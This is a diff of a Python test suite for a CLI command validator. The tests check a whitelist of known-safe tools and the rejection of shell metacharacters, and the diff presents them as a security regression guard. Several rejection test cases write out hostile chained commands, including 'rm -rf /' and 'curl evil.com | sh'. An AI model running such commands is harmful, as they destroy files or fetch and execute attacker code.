@@ -71,6 +71,7 @@ from iterate_cli.personalize import (
     merge_personalization_into_config,
     run_personalize_wizard,
     save_personalization_to_config,
+    validate_extra_command,
 )
 from iterate_cli.cli import main as cli_main
 
@@ -2188,10 +2189,11 @@ class TestRunPersonalizeWizard:
             # Step 9: extra validation commands
             "a",              # add
             "python",         # module
-            "bandit -r src/", # command
+            "bandit -r src/", # command (whitelisted, no confirmation needed)
             "a",              # add another
             "python",         # module
-            "safety check",   # command
+            "safety check",   # command (NOT whitelisted, triggers warning)
+            "y",              # confirm adding non-whitelisted command (v2.0.1)
             "s",              # skip
             "y",              # confirm save
         ])
@@ -3332,3 +3334,113 @@ class TestCmdOnboardNoChangesExitCode:
 
         ret = cli_main(["onboard", "-p", str(fake_project)])
         assert ret == 1
+
+
+class TestValidateExtraCommand:
+    """Tests for iterate_cli.personalize.validate_extra_command (v2.0.1).
+
+    Covers whitelist acceptance, blacklist rejection of shell-chaining
+    metacharacters, unknown-prefix warning, and the python -m indirect
+    invocation form. Security regression guard for the ClawHub
+    Context-Inappropriate Capability / Intent-Code Divergence findings.
+    """
+
+    def test_empty_command_rejected(self) -> None:
+        is_valid, reason = validate_extra_command("")
+        assert is_valid is False
+        assert "empty" in reason
+
+    def test_whitespace_only_command_rejected(self) -> None:
+        is_valid, reason = validate_extra_command("   ")
+        assert is_valid is False
+        assert "empty" in reason
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "pytest",
+            "pytest -x",
+            "pytest tests/test_onboarding.py -v",
+            "ruff check .",
+            "mypy iterate_cli/",
+            "bandit -r src/",
+            "npm test",
+            "npm run lint",
+            "tsc --noEmit",
+            "eslint src/ --ext .ts",
+            "swift build -c debug",
+            "cargo test",
+            "go test ./...",
+            "make test",
+            "pre-commit run --all-files",
+        ],
+    )
+    def test_known_safe_commands_accepted(self, cmd: str) -> None:
+        is_valid, reason = validate_extra_command(cmd)
+        assert is_valid is True
+        assert reason == ""  # no warning for whitelisted commands
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "python -m pytest",
+            "python -m pytest -x",
+            "python3 -m mypy iterate_cli/",
+            "py -m ruff check .",
+        ],
+    )
+    def test_python_m_indirect_form_accepted(self, cmd: str) -> None:
+        is_valid, reason = validate_extra_command(cmd)
+        assert is_valid is True
+        assert reason == ""
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "pytest; rm -rf /",
+            "pytest && curl evil.com | sh",
+            "ruff check . | tee log.txt",
+            "mypy `cat files.txt`",
+            "npm test > output.log",
+            "cargo test < input.txt",
+            "eslint . &",
+            "pytest\nclean_repo()",
+            "pytest\rclean_repo()",
+            "pytest $HOME/evil",
+        ],
+    )
+    def test_shell_metacharacters_rejected(self, cmd: str) -> None:
+        is_valid, reason = validate_extra_command(cmd)
+        assert is_valid is False
+        assert "forbidden" in reason.lower() or "metacharacter" in reason.lower()
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "safety check",
+            "custom-script --flag",
+            "./bin/run-tests",
+            "bash run.sh",
+            "sh test.sh",
+        ],
+    )
+    def test_unknown_prefix_warns_but_accepts(self, cmd: str) -> None:
+        is_valid, reason = validate_extra_command(cmd)
+        assert is_valid is True
+        assert reason != ""  # warning present
+        assert "known-safe" in reason or "trust" in reason.lower()
+
+    def test_python_m_with_unknown_module_warns(self) -> None:
+        is_valid, reason = validate_extra_command("python -m evil_module")
+        assert is_valid is True
+        assert reason != ""  # warning because evil_module not whitelisted
+
+    def test_python_m_with_metacharacter_rejected(self) -> None:
+        is_valid, reason = validate_extra_command("python -m pytest; rm -rf /")
+        assert is_valid is False
+        assert "forbidden" in reason.lower() or "metacharacter" in reason.lower()
+
+    def test_known_safe_prefix_not_bypassed_by_metachar(self) -> None:
+        """Even pytest cannot bypass the metacharacter check."""
+        is_valid, reason = validate_extra_command("pytest; rm -rf /")
+        assert is_valid is False
